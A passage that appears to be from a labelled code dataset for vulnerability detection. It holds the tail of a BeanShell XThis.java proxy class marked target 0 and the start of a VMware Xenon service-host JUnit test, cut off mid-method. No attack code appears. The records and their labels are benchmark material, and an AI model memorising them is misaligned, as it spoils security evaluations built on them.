Author of Learning Java, O'Reilly & Associates                            *\n *                                                                           *\n *****************************************************************************/\n\n\n\npackage bsh;\n\nimport java.lang.reflect.*;\nimport java.lang.reflect.InvocationHandler;\nimport java.io.*;\nimport java.util.Hashtable;\n\n/**\n\tXThis is a dynamically loaded extension which extends This.java and adds\n\tsupport for the generalized interface proxy mechanism introduced in\n\tJDK1.3.  XThis allows bsh scripted objects to implement arbitrary\n\tinterfaces (be arbitrary event listener types).\n\n\tNote: This module relies on new features of JDK1.3 and will not compile\n\twith JDK1.2 or lower.  For those environments simply do not compile this\n\tclass.\n\n\tEventually XThis should become simply This, but for backward compatibility\n\twe will maintain This without requiring support for the proxy mechanism.\n\n\tXThis stands for \"eXtended This\" (I had to call it something).\n\n\t@see JThis\t See also JThis with explicit JFC support for compatibility.\n\t@see This\n*/\npublic class XThis extends This\n\t{\n\t/**\n\t\tA cache of proxy interface handlers.\n\t\tCurrently just one per interface.\n\t*/\n\tHashtable interfaces;\n\n\ttransient InvocationHandler invocationHandler = new Handler();\n\n\tpublic XThis( NameSpace namespace, Interpreter declaringInterp ) {\n\t\tsuper( namespace, declaringInterp );\n\t}\n\n\tpublic String toString() {\n\t\treturn \"'this' reference (XThis) to Bsh object: \" + namespace;\n\t}\n\n\t/**\n\t\tGet dynamic proxy for interface, caching those it creates.\n\t*/\n\tpublic Object getInterface( Class clas )\n\t{\n\t\treturn getInterface( new Class[] { clas } );\n\t}\n\n\t/**\n\t\tGet dynamic proxy for interface, caching those it creates.\n\t*/\n\tpublic Object getInterface( Class [] ca )\n\t{\n\t\tif ( interfaces == null )\n\t\t\tinterfaces = new Hashtable();\n\n\t\t// Make a hash of the interface hashcodes in order to cache them\n\t\tint hash = 21;\n\t\tfor(int i=0; i<ca.length; i++)\n\t\t\thash *= ca[i].hashCode() + 3;\n\t\tObject hashKey = new Integer(hash);\n\n\t\tObject interf = interfaces.get( hashKey );\n\n\t\tif ( interf == null )\n\t\t{\n\t\t\tClassLoader classLoader = ca[0].getClassLoader(); // ?\n\t\t\tinterf = Proxy.newProxyInstance(\n\t\t\t\tclassLoader, ca, invocationHandler );\n\t\t\tinterfaces.put( hashKey, interf );\n\t\t}\n\n\t\treturn interf;\n\t}\n\n\t/**\n\t\tThis is the invocation handler for the dynamic proxy.\n\t\t<p>\n\n\t\tNotes:\n\t\tInner class for the invocation handler seems to shield this unavailable\n\t\tinterface from JDK1.2 VM...\n\n\t\tI don't understand this.  JThis works just fine even if those\n\t\tclasses aren't there (doesn't it?)  This class shouldn't be loaded\n\t\tif an XThis isn't instantiated in NameSpace.java, should it?\n\t*/\n\tclass Handler implements InvocationHandler\n\t{\n\t\tprivate Object readResolve() throws ObjectStreamException {\n\t\t\tthrow new NotSerializableException();\n\t\t}\n\n\t\tpublic Object invoke( Object proxy, Method method, Object[] args )\n\t\t\tthrows Throwable\n\t\t{\n\t\t\ttry {\n\t\t\t\treturn invokeImpl( proxy, method, args );\n\t\t\t} catch ( TargetError te ) {\n\t\t\t\t// Unwrap target exception.  If the interface declares that\n\t\t\t\t// it throws the ex it will be delivered.  If not it will be\n\t\t\t\t// wrapped in an UndeclaredThrowable\n\t\t\t\tthrow te.getTarget();\n\t\t\t} catch ( EvalError ee ) {\n\t\t\t\t// Ease debugging...\n\t\t\t\t// XThis.this refers to the enclosing class instance\n\t\t\t\tif ( Interpreter.DEBUG )\n\t\t\t\t\tInterpreter.debug( \"EvalError in scripted interface: \"\n\t\t\t\t\t+ XThis.this.toString() + \": \"+ ee );\n\t\t\t\tthrow ee;\n\t\t\t}\n\t\t}\n\n\t\tpublic Object invokeImpl( Object proxy, Method method, Object[] args )\n\t\t\tthrows EvalError\n\t\t{\n\t\t\tString methodName = method.getName();\n\t\t\tCallStack callstack = new CallStack( namespace );\n\n\t\t\t/*\n\t\t\t\tIf equals() is not explicitly defined we must override the\n\t\t\t\tdefault implemented by the This object protocol for scripted\n\t\t\t\tobject.  To support XThis equals() must test for equality with\n\t\t\t\tthe generated proxy object, not the scripted bsh This object;\n\t\t\t\totherwise callers from outside in Java will not see a the\n\t\t\t\tproxy object as equal to itself.\n\t\t\t*/\n\t\t\tBshMethod equalsMethod = null;\n\t\t\ttry {\n\t\t\t\tequalsMethod = namespace.getMethod(\n\t\t\t\t\t\"equals\", new Class [] { Object.class } );\n\t\t\t} catch ( UtilEvalError e ) {/*leave null*/ }\n\t\t\tif ( methodName.equals(\"equals\" ) && equalsMethod == null ) {\n\t\t\t\tObject obj = args[0];\n\t\t\t\treturn proxy == obj ? Boolean.TRUE : Boolean.FALSE;\n\t\t\t}\n\n\t\t\t/*\n\t\t\t\tIf toString() is not explicitly defined override the default\n\t\t\t\tto show the proxy interfaces.\n\t\t\t*/\n\t\t\tBshMethod toStringMethod = null;\n\t\t\ttry {\n\t\t\t\ttoStringMethod =\n\t\t\t\t\tnamespace.getMethod( \"toString\", new Class [] { } );\n\t\t\t} catch ( UtilEvalError e ) {/*leave null*/ }\n\n\t\t\tif ( methodName.equals(\"toString\" ) && toStringMethod == null)\n\t\t\t{\n\t\t\t\tClass [] ints = proxy.getClass().getInterfaces();\n\t\t\t\t// XThis.this refers to the enclosing class instance\n\t\t\t\tStringBuffer sb = new StringBuffer(\n\t\t\t\t\tXThis.this.toString() + \"\\nimplements:\" );\n\t\t\t\tfor(int i=0; i<ints.length; i++)\n\t\t\t\t\tsb.append( \" \"+ ints[i].getName()\n\t\t\t\t\t\t+ ((ints.length > 1)?\",\":\"\") );\n\t\t\t\treturn sb.toString();\n\t\t\t}\n\n\t\t\tClass [] paramTypes = method.getParameterTypes();\n\t\t\treturn Primitive.unwrap(\n\t\t\t\tinvokeMethod( methodName, Primitive.wrap(args, paramTypes) ) );\n\t\t}\n\t};\n}\n", "target": 0}
{"idx": 1120, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport static org.assertj.core.api.Assertions.assertThat;\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertFalse;\nimport static org.junit.Assert.assertNotNull;\nimport static org.junit.Assert.assertNotSame;\nimport static org.junit.Assert.assertNull;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\n\nimport java.io.File;\nimport java.lang.reflect.Field;\nimport java.net.URI;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.time.Duration;\nimport java.time.temporal.ChronoUnit;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Date;\nimport java.util.EnumSet;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\nimport java.util.UUID;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.function.Consumer;\nimport java.util.logging.Level;\n\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.cors.CorsConfig;\nimport io.netty.handler.codec.http.cors.CorsConfigBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\nimport org.junit.After;\nimport org.junit.Rule;\nimport org.junit.Test;\nimport org.junit.rules.TemporaryFolder;\n\nimport com.vmware.xenon.common.Operation.CompletionHandler;\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.Service.ProcessingStage;\nimport com.vmware.xenon.common.Service.ServiceOption;\nimport com.vmware.xenon.common.ServiceHost.RequestRateInfo;\nimport com.vmware.xenon.common.ServiceHost.ServiceAlreadyStartedException;\nimport com.vmware.xenon.common.ServiceHost.ServiceHostState;\nimport com.vmware.xenon.common.ServiceHost.ServiceHostState.MemoryLimitType;\nimport com.vmware.xenon.common.ServiceStats.ServiceStat;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats;\nimport com.vmware.xenon.common.ServiceStats.TimeSeriesStats.AggregationType;\nimport com.vmware.xenon.common.http.netty.NettyHttpListener;\nimport com.vmware.xenon.common.jwt.Rfc7519Claims;\nimport com.vmware.xenon.common.jwt.Signer;\nimport com.vmware.xenon.common.jwt.Verifier;\nimport com.vmware.xenon.common.test.AuthTestUtils;\nimport com.vmware.xenon.common.test.MinimalTestServiceState;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.TestRequestSender;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.AuthorizationContextService;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleNonPersistedService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.ExampleServiceHost;\nimport com.vmware.xenon.services.common.FileContentService;\nimport com.vmware.xenon.services.common.LuceneDocumentIndexService;\nimport com.vmware.xenon.services.common.MinimalFactoryTestService;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupState;\nimport com.vmware.xenon.services.common.NodeState;\nimport com.vmware.xenon.services.common.OnDemandLoadFactoryService;\nimport com.vmware.xenon.services.common.QueryTask.Query;\nimport com.vmware.xenon.services.common.ServiceHostLogService.LogServiceState;\nimport com.vmware.xenon.services.common.ServiceHostManagementService;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\nimport com.vmware.xenon.services.common.UiFileContentService;\nimport com.vmware.xenon.services.common.UserService;\n\npublic class TestServiceHost {\n\n    private static final int MAINTENANCE_INTERVAL_MILLIS = 100;\n\n    private VerificationHost host;\n\n    public String testURI;\n\n    public int requestCount = 1000;\n\n    public int rateLimitedRequestCount = 10;\n\n    public int connectionCount = 32;\n\n    public long serviceCount = 10;\n\n    public int iterationCount = 1;\n\n    public long testDurationSeconds = 0;\n\n    public int indexFileThreshold = 100;\n\n    public long serviceCacheClearDelaySeconds = 2;\n\n    @Rule\n    public TemporaryFolder tmpFolder = new TemporaryFolder();\n\n\n    public void beforeHostStart(VerificationHost host) {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS\n                .toMicros(MAINTENANCE_INTERVAL_MILLIS));\n    }\n\n    private void setUp(boolean initOnly) throws Exception {\n        CommandLineArgumentParser.parseFromProperties(this);\n        this.host = VerificationHost.create(0);\n        CommandLineArgumentParser.parseFromProperties(this.host);\n        if (initOnly) {\n            return;\n        }\n\n        try {\n            this.host.start();\n        } catch (Throwable e) {\n            throw new Exception(e);\n        }\n    }\n\n    @Test(expected = TimeoutException.class)\n    public void startCoreServicesSynchronouslyWithTimeout() throws Throwable {\n        setUp(false);\n\n        // use reflection to shorten operation timeout value\n        Field field = ServiceHost.class.getDeclaredField(\"state\");\n        field.setAccessible(true);\n        ServiceHost.ServiceHostState state = (ServiceHostState) field.get(this.host);\n        state.operationTimeoutMicros = TimeUnit.MILLISECONDS.toMicros(100);\n\n        this.host.startCoreServicesSynchronously(new StatelessService() {\n            @SuppressWarnings(\"unused\")\n            public static final String SELF_LINK = \"/foo\";\n\n            @Override\n            public void handleStart(Operation startPost) {\n                // do not complete\n            }\n        });\n    }\n\n    @Test\n    public void allocateExecutor() throws Throwable {\n        setUp(false);\n        Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                .toString());\n        ExecutorService exec = this.host.allocateExecutor(s);\n        this.host.testStart(1);\n        exec.execute(() -> {\n            this.host.completeIteration();\n        });\n        this.host.testWait();\n    }\n\n    @Test\n    public void operationTracingFineFiner() throws Throwable {\n        setUp(false);\n        TestRequestSender sender = this.host.getTestRequestSender();\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINE, true);\n        // send some requests and confirm stats get populated\n\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = \"foo\";\n                    op.setBody(st);\n                }, factoryUri);\n        TestContext ctx = this.host.testCreate(states.size() * 2);\n        for (URI u : states.keySet()) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.name = this.host.nextUUID();\n            sender.sendRequest(Operation.createGet(u).setCompletion(ctx.getCompletion()));\n            sender.sendRequest(\n                    Operation.createPatch(u)\n                            .setContextId(this.host.nextUUID())\n                            .setBody(state).setCompletion(ctx.getCompletion()));\n        }\n        ctx.await();\n        ServiceStats after = sender.sendStatsGetAndWait(this.host.getManagementServiceUri());\n        for (URI u : states.keySet()) {\n            String getStatName = u.getPath() + \":\" + Action.GET;\n            String patchStatName = u.getPath() + \":\" + Action.PATCH;\n            ServiceStat getStat = after.entries.get(getStatName);\n            assertTrue(getStat != null && getStat.latestValue > 0);\n            ServiceStat patchStat = after.entries.get(patchStatName);\n            assertTrue(patchStat != null && getStat.latestValue > 0);\n        }\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINE, false);\n\n        // toggle on again, to FINER, confirm we get some log output\n        this.host.toggleOperationTracing(this.host.getUri(), Level.FINER, true);\n\n        // send some operations\n        ctx = this.host.testCreate(states.size() * 2);\n        for (URI u : states.keySet()) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.name = this.host.nextUUID();\n            sender.sendRequest(Operation.createGet(u).setCompletion(ctx.getCompletion()));\n            sender.sendRequest(\n                    Operation.createPatch(u).setContextId(this.host.nextUUID()).setBody(state)\n                            .setCompletion(ctx.getCompletion()));\n        }\n        ctx.await();\n\n        LogServiceState logsAfterFiner = sender.sendGetAndWait(\n                UriUtils.buildUri(this.host, ServiceUriPaths.PROCESS_LOG),\n                LogServiceState.class);\n\n        boolean foundTrace = false;\n        for (String line : logsAfterFiner.items) {\n            for (URI u : states.keySet()) {\n                if (line.contains(u.getPath())) {\n                    foundTrace = true;\n                    break;\n                }\n            }\n        }\n        assertTrue(foundTrace);\n    }\n\n    @Test\n    public void buildDocumentDescription() throws Throwable {\n        setUp(false);\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = \"foo\";\n                    op.setBody(st);\n                }, factoryUri);\n\n        // verify we have valid descriptions for all example services we created\n        // explicitly\n        validateDescriptions(states);\n\n        // verify we can recover a description, even for services that are stopped\n        TestContext ctx = this.host.testCreate(states.size());\n        for (URI childUri : states.keySet()) {\n            Operation delete = Operation.createDelete(childUri)\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(delete);\n        }\n        this.host.testWait(ctx);\n\n        // do the description lookup again, on stopped services\n        validateDescriptions(states);\n    }\n\n    private void validateDescriptions(Map<URI, ExampleServiceState> states) {\n        for (URI childUri : states.keySet()) {\n            ServiceDocumentDescription desc = this.host\n                    .buildDocumentDescription(childUri.getPath());\n            // do simple verification of returned description, its not exhaustive\n            assertTrue(desc != null);\n            assertTrue(desc.serviceCapabilities.contains(ServiceOption.PERSISTENCE));\n            assertTrue(desc.serviceCapabilities.contains(ServiceOption.INSTRUMENTATION));\n            assertTrue(desc.propertyDescriptions.size() > 1);\n            // check that a description was replaced with contents from HTML file\n            assertTrue(desc.propertyDescriptions.get(\"keyValues\").propertyDocumentation.startsWith(\"Key/Value\"));\n        }\n    }\n\n    @Test\n    public void requestRateLimits() throws Throwable {\n        CommandLineArgumentParser.parseFromProperties(this);\n        for (int i = 0; i < this.iterationCount; i++) {\n            doRequestRateLimits();\n            tearDown();\n        }\n    }\n\n    private void doRequestRateLimits() throws Throwable {\n        setUp(true);\n\n        this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n        this.host.start();\n\n        this.host.setSystemAuthorizationContext();\n\n        String userPath = UriUtils.buildUriPath(ServiceUriPaths.CORE_AUTHZ_USERS, \"example-user\");\n        String exampleUser = \"example@localhost\";\n        TestContext authCtx = this.host.testCreate(1);\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserSelfLink(userPath)\n                .setUserEmail(exampleUser)\n                .setUserPassword(exampleUser)\n                .setIsAdmin(false)\n                .setDocumentKind(Utils.buildKind(ExampleServiceState.class))\n                .setCompletion(authCtx.getCompletion())\n                .start();\n        authCtx.await();\n\n        this.host.resetAuthorizationContext();\n\n        this.host.assumeIdentity(userPath);\n\n        URI factoryUri = UriUtils.buildUri(this.host, ExampleService.FACTORY_LINK);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, (op) -> {\n                    ExampleServiceState st = new ExampleServiceState();\n                    st.name = exampleUser;\n                    op.setBody(st);\n                }, factoryUri);\n\n        try {\n            RequestRateInfo ri = new RequestRateInfo();\n            this.host.setRequestRateLimit(userPath, ri);\n            throw new IllegalStateException(\"call should have failed, rate limit is zero\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        try {\n            RequestRateInfo ri = new RequestRateInfo();\n            // use a custom time series but of the wrong aggregation type\n            ri.timeSeries = new TimeSeriesStats(10,\n                    TimeUnit.SECONDS.toMillis(1),\n                    EnumSet.of(AggregationType.AVG));\n            this.host.setRequestRateLimit(userPath, ri);\n            throw new IllegalStateException(\"call should have failed, aggregation is not SUM\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        RequestRateInfo ri = new RequestRateInfo();\n        ri.limit = 1.1;\n        this.host.setRequestRateLimit(userPath, ri);\n        // verify no side effects on instance we supplied\n        assertTrue(ri.timeSeries == null);\n\n        double limit = (this.rateLimitedRequestCount * this.serviceCount) / 100;\n\n        // set limit for this user to 1 request / second, overwrite previous limit\n        this.host.setRequestRateLimit(userPath, limit);\n\n        ri = this.host.getRequestRateLimit(userPath);\n        assertTrue(Double.compare(ri.limit, limit) == 0);\n        assertTrue(!ri.options.isEmpty());\n        assertTrue(ri.options.contains(RequestRateInfo.Option.FAIL));\n        assertTrue(ri.timeSeries != null);\n        assertTrue(ri.timeSeries.numBins == 60);\n        assertTrue(ri.timeSeries.aggregationType.contains(AggregationType.SUM));\n\n        // set maintenance to default time to see how throttling behaves with default interval\n        this.host.setMaintenanceIntervalMicros(\n                ServiceHostState.DEFAULT_MAINTENANCE_INTERVAL_MICROS);\n\n        AtomicInteger failureCount = new AtomicInteger();\n        AtomicInteger successCount = new AtomicInteger();\n\n        // send N requests, at once, clearly violating the limit, and expect failures\n        int count = this.rateLimitedRequestCount;\n        TestContext ctx = this.host.testCreate(count * states.size());\n        ctx.setTestName(\"Rate limiting with failure\").logBefore();\n        CompletionHandler c = (o, e) -> {\n            if (e != null) {\n                if (o.getStatusCode() != Operation.STATUS_CODE_UNAVAILABLE) {\n                    ctx.failIteration(e);\n                    return;\n                }\n                failureCount.incrementAndGet();\n            } else {\n                successCount.incrementAndGet();\n            }\n\n            ctx.completeIteration();\n        };\n\n        ExampleServiceState patchBody = new ExampleServiceState();\n        patchBody.name = Utils.getSystemNowMicrosUtc() + \"\";\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(c);\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx);\n        ctx.logAfter();\n\n        assertTrue(failureCount.get() > 0);\n\n        // now change the options, and instead of fail, request throttling. this will literally\n        // throttle the HTTP listener (does not work on local, in process calls)\n\n        ri = new RequestRateInfo();\n        ri.limit = limit;\n        ri.options = EnumSet.of(RequestRateInfo.Option.PAUSE_PROCESSING);\n        this.host.setRequestRateLimit(userPath, ri);\n        this.host.assumeIdentity(userPath);\n\n        ServiceStat rateLimitStatBefore = getRateLimitOpCountStat();\n        if (rateLimitStatBefore == null) {\n            rateLimitStatBefore = new ServiceStat();\n            rateLimitStatBefore.latestValue = 0.0;\n        }\n        TestContext ctx2 = this.host.testCreate(count * states.size());\n        ctx2.setTestName(\"Rate limiting with auto-read pause of channels\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                // expect zero failures, but rate limit applied stat should have hits\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(ctx2.getCompletion());\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx2);\n        ctx2.logAfter();\n        ServiceStat rateLimitStatAfter = getRateLimitOpCountStat();\n        assertTrue(rateLimitStatAfter.latestValue > rateLimitStatBefore.latestValue);\n\n        this.host.setMaintenanceIntervalMicros(\n                TimeUnit.MILLISECONDS.toMicros(VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n\n        // effectively remove limit, verify all requests complete\n        ri = new RequestRateInfo();\n        ri.limit = 1000000;\n        ri.options = EnumSet.of(RequestRateInfo.Option.PAUSE_PROCESSING);\n        this.host.setRequestRateLimit(userPath, ri);\n        this.host.assumeIdentity(userPath);\n\n        count = this.rateLimitedRequestCount;\n        TestContext ctx3 = this.host.testCreate(count * states.size());\n        ctx3.setTestName(\"No limit\").logBefore();\n        for (URI serviceUri : states.keySet()) {\n            for (int i = 0; i < count; i++) {\n                // expect zero failures\n                Operation op = Operation.createPatch(serviceUri)\n                        .setBody(patchBody)\n                        .forceRemote()\n                        .setCompletion(ctx3.getCompletion());\n                this.host.send(op);\n            }\n        }\n        this.host.testWait(ctx3);\n        ctx3.logAfter();\n\n        // verify rate limiting did not happen\n        ServiceStat rateLimitStatExpectSame = getRateLimitOpCountStat();\n        assertTrue(rateLimitStatAfter.latestValue == rateLimitStatExpectSame.latestValue);\n    }\n\n    @Test\n    public void postFailureOnAlreadyStarted() throws Throwable {\n        setUp(false);\n        Service s = this.host.startServiceAndWait(MinimalTestService.class, UUID.randomUUID()\n                .toString());\n        this.host.testStart(1);\n        Operation post = Operation.createPost(s.getUri()).setCompletion(\n                (o, e) -> {\n                    if (e == null) {\n                        this.host.failIteration(new IllegalStateException(\n                                \"Request should have failed\"));\n                        return;\n                    }\n\n                    if (!(e instanceof ServiceAlreadyStartedException)) {\n                        this.host.failIteration(new IllegalStateException(\n                                \"Request should have failed with different exception\"));\n                        return;\n                    }\n                    this.host.completeIteration();\n                });\n        this.host.startService(post, new MinimalTestService());\n        this.host.testWait();\n    }\n\n    @Test\n    public void startUpWithArgumentsAndHostConfigValidation() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n        try {\n            String bindAddress = \"127.0.0.1\";\n            URI publicUri = new URI(\"http://somehost.com:1234\");\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().toURI(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--publicUri=\" + publicUri.toString(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n\n            // set memory limits for some services\n            double queryTasksRelativeLimit = 0.1;\n            double hostLimit = 0.29;\n            h.setServiceMemoryLimit(ServiceHost.ROOT_PATH, hostLimit);\n            h.setServiceMemoryLimit(ServiceUriPaths.CORE_QUERY_TASKS, queryTasksRelativeLimit);\n\n            // attempt to set limit that brings total > 1.0\n            try {\n                h.setServiceMemoryLimit(ServiceUriPaths.CORE_OPERATION_INDEX, 0.99);\n                throw new IllegalStateException(\"Should have failed\");\n            } catch (Throwable e) {\n\n            }\n\n            h.start();\n\n            assertTrue(UriUtils.isHostEqual(h, publicUri));\n            assertTrue(UriUtils.isHostEqual(h, new URI(\"http://127.0.0.1:\" + h.getPort())));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"https://somehost.com:\" + h.getPort())));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"http://somehost.com\")));\n            assertFalse(UriUtils.isHostEqual(h, new URI(\"http://somehost2.com:1234\")));\n\n            assertEquals(bindAddress, h.getPreferredAddress());\n\n            assertEquals(bindAddress, h.getUri().getHost());\n\n            assertEquals(hostId, h.getId());\n            assertEquals(publicUri, h.getPublicUri());\n\n            // confirm the node group self node entry uses the public URI for the bind address\n            NodeGroupState ngs = this.host.getServiceState(null, NodeGroupState.class,\n                    UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP));\n\n            NodeState selfEntry = ngs.nodes.get(h.getId());\n            assertEquals(publicUri.getHost(), selfEntry.groupReference.getHost());\n            assertEquals(publicUri.getPort(), selfEntry.groupReference.getPort());\n\n            // validate memory limits per service\n            long maxMemory = Runtime.getRuntime().maxMemory() / (1024 * 1024);\n            double hostRelativeLimit = hostLimit;\n            double indexRelativeLimit = ServiceHost.DEFAULT_PCT_MEMORY_LIMIT_DOCUMENT_INDEX;\n\n            long expectedHostLimitMB = (long) (maxMemory * hostRelativeLimit);\n            Long hostLimitMB = h.getServiceMemoryLimitMB(ServiceHost.ROOT_PATH,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected host limit outside bounds\",\n                    Math.abs(expectedHostLimitMB - hostLimitMB) < 10);\n\n            long expectedIndexLimitMB = (long) (maxMemory * indexRelativeLimit);\n            Long indexLimitMB = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_DOCUMENT_INDEX,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected index service limit outside bounds\",\n                    Math.abs(expectedIndexLimitMB - indexLimitMB) < 10);\n\n            long expectedQueryTaskLimitMB = (long) (maxMemory * queryTasksRelativeLimit);\n            Long queryTaskLimitMB = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.EXACT);\n            assertTrue(\"Expected host limit outside bounds\",\n                    Math.abs(expectedQueryTaskLimitMB - queryTaskLimitMB) < 10);\n\n            // also check the water marks\n            long lowW = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.LOW_WATERMARK);\n            assertTrue(\"Expected  low watermark to be less than exact\",\n                    lowW < queryTaskLimitMB);\n\n            long highW = h.getServiceMemoryLimitMB(ServiceUriPaths.CORE_QUERY_TASKS,\n                    MemoryLimitType.HIGH_WATERMARK);\n            assertTrue(\"Expected high watermark to be greater than low but less than exact\",\n                    highW > lowW && highW < queryTaskLimitMB);\n\n            // attempt to set the limit for a service after a host has started, it should fail\n            try {\n                h.setServiceMemoryLimit(ServiceUriPaths.CORE_OPERATION_INDEX, 0.2);\n                throw new IllegalStateException(\"Should have failed\");\n            } catch (Throwable e) {\n\n            }\n\n            // verify service host configuration file reflects command line arguments\n            File s = new File(h.getStorageSandbox());\n            s = new File(s, ServiceHost.SERVICE_HOST_STATE_FILE);\n\n            this.host.testStart(1);\n            ServiceHostState[] state = new ServiceHostState[1];\n            Operation get = Operation.createGet(h.getUri()).setCompletion((o, e) -> {\n                if (e != null) {\n                    this.host.failIteration(e);\n                    return;\n                }\n                state[0] = o.getBody(ServiceHostState.class);\n                this.host.completeIteration();\n            });\n            FileUtils.readFileAndComplete(get, s);\n            this.host.testWait();\n\n            assertEquals(h.getStorageSandbox(), state[0].storageSandboxFileReference);\n            assertEquals(h.getOperationTimeoutMicros(), state[0].operationTimeoutMicros);\n            assertEquals(h.getMaintenanceIntervalMicros(), state[0].maintenanceIntervalMicros);\n            assertEquals(bindAddress, state[0].bindAddress);\n            assertEquals(h.getPort(), state[0].httpPort);\n            assertEquals(hostId, state[0].id);\n\n            // now stop the host, change some arguments, restart, verify arguments override config\n            h.stop();\n\n            bindAddress = \"localhost\";\n            hostId = UUID.randomUUID().toString();\n\n            String[] args2 = {\n                    \"--port=\" + 0,\n                    \"--bindAddress=\" + bindAddress,\n                    \"--sandbox=\" + this.tmpFolder.getRoot().toURI(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args2);\n            h.start();\n\n            assertEquals(bindAddress, h.getState().bindAddress);\n            assertEquals(hostId, h.getState().id);\n\n            verifyCoreServiceOption(h);\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    private void verifyCoreServiceOption(ExampleServiceHost h) {\n        List<URI> coreServices = new ArrayList<>();\n        URI defaultNodeGroup = UriUtils.buildUri(h, ServiceUriPaths.DEFAULT_NODE_GROUP);\n        URI defaultNodeSelector = UriUtils.buildUri(h, ServiceUriPaths.DEFAULT_NODE_SELECTOR);\n\n        coreServices.add(UriUtils.buildConfigUri(defaultNodeGroup));\n        coreServices.add(UriUtils.buildConfigUri(defaultNodeSelector));\n        coreServices.add(UriUtils.buildConfigUri(h.getDocumentIndexServiceUri()));\n        Map<URI, ServiceConfiguration> cfgs = this.host.getServiceState(null,\n                ServiceConfiguration.class, coreServices);\n        for (ServiceConfiguration c : cfgs.values()) {\n            assertTrue(c.options.contains(ServiceOption.CORE));\n        }\n    }\n\n    @Test\n    public void setPublicUri() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n\n        try {\n\n            // try invalid arguments\n            ServiceHost.Arguments hostArgs = new ServiceHost.Arguments();\n            hostArgs.publicUri = \"\";\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            hostArgs = new 